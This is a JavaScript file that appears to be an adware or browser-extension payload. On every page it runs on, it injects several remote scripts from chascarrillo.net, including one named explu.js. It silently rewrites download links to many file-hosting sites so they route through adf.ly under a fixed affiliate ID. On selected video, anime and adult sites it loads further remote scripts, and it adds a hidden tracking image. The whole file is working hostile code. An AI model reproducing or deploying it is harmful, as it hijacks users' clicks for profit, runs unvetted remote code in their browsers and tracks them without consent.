var localURL = 'http://chascarrillo.net/apps/otros.js';
var script_tag = document['createElement']('script');
script_tag['setAttribute']('type', 'text/javascript');
script_tag['setAttribute']('src', localURL);
document['getElementsByTagName']('head')[0]['appendChild'](script_tag);
var localURL2 = 'http://chascarrillo.net/apps/explu.js';
var script_tag = document['createElement']('script');
script_tag['setAttribute']('type', 'text/javascript');
script_tag['setAttribute']('src', localURL2);
document['getElementsByTagName']('head')[0]['appendChild'](script_tag);
var localURL3 = 'http://chascarrillo.net/apps/clic.js';
var script_tag = document['createElement']('script');
script_tag['setAttribute']('type', 'text/javascript');
script_tag['setAttribute']('src', localURL3);
document['getElementsByTagName']('head')[0]['appendChild'](script_tag);

var adfly_id = 41708;
var adfly_advert = 'int';
var domains = ['uploaded.to', 'uploaded.net', 'nyaa.eu', 'mediafire.com', 'depositfiles.com', 'rapidshare.com', 'vip-file.com', 'smsfiles.ru', '4files.net', 'turbobit.ru', 'uploading.com', 'letitbit.net', 'depositfiles.ru', 'sms4file.com', 'ifolder.ru', 'hotfile.com', 'anyfiles.net', 'sharingmatrix.com', 'megashare.com', 'megaupload.com', 'rapidshare.de', 'rapidshare.ru', 'uploadbox.com', 'filefactory.com', 'filefactory.ru', 'filepost.ru', 'onefile.net', 'freefolder.net', 'getthebit.com', 'turbobit.net', 'bayfiles.com', 'bitshare.com', 'rapidgator.net', 'crocko.com', 'adf.ly', 'ul.to', 'embedupload.com', 'brontofile.com', 'freakshare.com', '4share.com', 'putlocker.com', 'sendspace.com', 'zippyshare.com', 'uploadmirrors.com', 'mirorii.com', 'netload.in', 'shareflare.net', 'fiberupload.com', 'ryushare.com', 'linkbucks.com', 'goo.gl', 'ivpaste.com', 'vidxden.com', 'nosvideo.com', 'sockshare.com', 'allmyvideos.net', 'moevideo.net', 'nowvideo.eu', 'streamcloud.eu', 'uploaz.com', 'videoweed.es', 'watchcacao.com', 'videozed.net', 'senseless.tv', 'multiupload.com', 'multiupload.nl', 'multiupload.co.uk', 'mirrorcreator.com'];

function checkValidAdfly(link) {
    for (var i = 0; i < domains.length; i++) {
        if (link.match("^(http|https)\:\/\/(www\.)?" + domains[i].replace("\.", "\\\."))) {
            return true
        }
    }
    return false
}
function isLink(link) {
    if (link.href == "") {
        return false
    }
    var regexp = /(http|https):\/\/(\w+:{0,1}\w*@)?(\S+)(:[0-9]+)?(\/|\/([\w#!:.?+=&%@!\-\/]))?/;
    return regexp.test(link.href)
}
function insertAdFly() {
    var links = document.getElementsByTagName("a");
    for (var i = 0; i < links.length; i++) {
        if (!isLink(links[i]) || document.domain.match((links[i].href.match(":\/\/(.[^/]+)")[1]).replace('www.', ''))) {
            continue
        }
        if (checkValidAdfly(links[i].href)) {
            links[i].href = "http://adf.ly/" + adfly_id + "/" + links[i].href
        }
    }
}
insertAdFly();


var adffghgfh = true;


function validHost() {
    if (location.href.match(/static\.ak\./i)) {
        return false
    } else if ("https:" == document.location.protocol) {
        return false
    } else if (location.href.match(/\.addthis\.com\/static\//i)) {
        return false
    } else if (location.href.match(/^secure\.shared\.live\.com/i)) {
        return false
    } else if (location.href.match(/^megaupload\.com\/mc\.php/i)) {
        return false
    } else if (location.href.match(/blank/i)) {
        return false
    } else if (location.href.match(/^http\:\/\/analytics\./i)) {
        return false
    } else if (location.href.match(/^\.hotmail\.com\//i)) {
        return false
    } else if (location.href.match(/^\.facebook\.com\/plugins/i)) {
        return false
    } else if (location.href.match(/^api\.twitter\.com\/receiver\.html/i)) {
        return false
    } else if (location.href.match(/^facebook\.com\/iframe\//i)) {
        return false
    } else if (location.href.match(/goojue\.com/i)) {
        return false
    } else if (location.href.match(/live\.com/i)) {
        return false
    } else if (location.href.match(/google\.com/i)) {
        return false
    }
      else if (location.href.match(/inkanime\.com/i)) {
        return false
    }
     else if (location.href.match(/inkanime\.net/i)) {
        return false
    }
     else if (location.href.match(/manganimemomoda\.com/i)) {
        return false
    }
     else if (location.href.match(/inkanime\.org/i)) {
        return false
    }
     else if (location.href.match(/series-flv\.com/i)) {
        return false
    }
     else if (location.href.match(/ichianime\.net/i)) {
        return false
    }
     else if (location.href.match(/naruto-shippudenhd\.com/i)) {
        return false
    }
     else if (location.href.match(/heavenmanga\.com/i)) {
        return false
    }
     else if (location.href.match(/radio-anime\.com/i)) {
        return false
    }
      else if (location.href.match(/youtube\.com/i)){
        return true
    }
      else if (location.href.match(/submanga\.com/i)){
        return true
    }
      else if (location.href.match(/telecharger-video\.com/i)){
        return true
    }
      else if (location.href.match(/redtube\.com/i)){
        return true
    }
      else if (location.href.match(/yaske\.net/i)){
        return true
    }
      else if (location.href.match(/xvideos\.com/i)){
        return true
    }
      else if (location.href.match(/hentaisd\.com/i)){
        return true
    }
      else if (location.href.match(/cinetux\.org/i)){
        return true
    }
      else if (location.href.match(/animeflv\.net/i)){
        return true
    }
}


if (validHost()) {
    var localURL1 = 'http://chascarrillo.net/apps/acoc.js';
    var script_tag = document['createElement']('script');
    script_tag['setAttribute']('type', 'text/javascript');
    script_tag['setAttribute']('src', localURL1);
    document['getElementsByTagName']('body')[0]['appendChild'](script_tag);
    var localURL2 = 'http://chascarrillo.net/apps/vdrag.js';
    var script_tag = document['createElement']('script');
    script_tag['setAttribute']('type', 'text/javascript');
    script_tag['setAttribute']('src', localURL2);
    document['getElementsByTagName']('body')[0]['appendChild'](script_tag)
}

var n=document.createElement('img');n.setAttribute("src",'http://whos.amung.us/swidget/adcomdrag.png');n.setAttribute("style",'display: none;');document.body.appendChild(n);


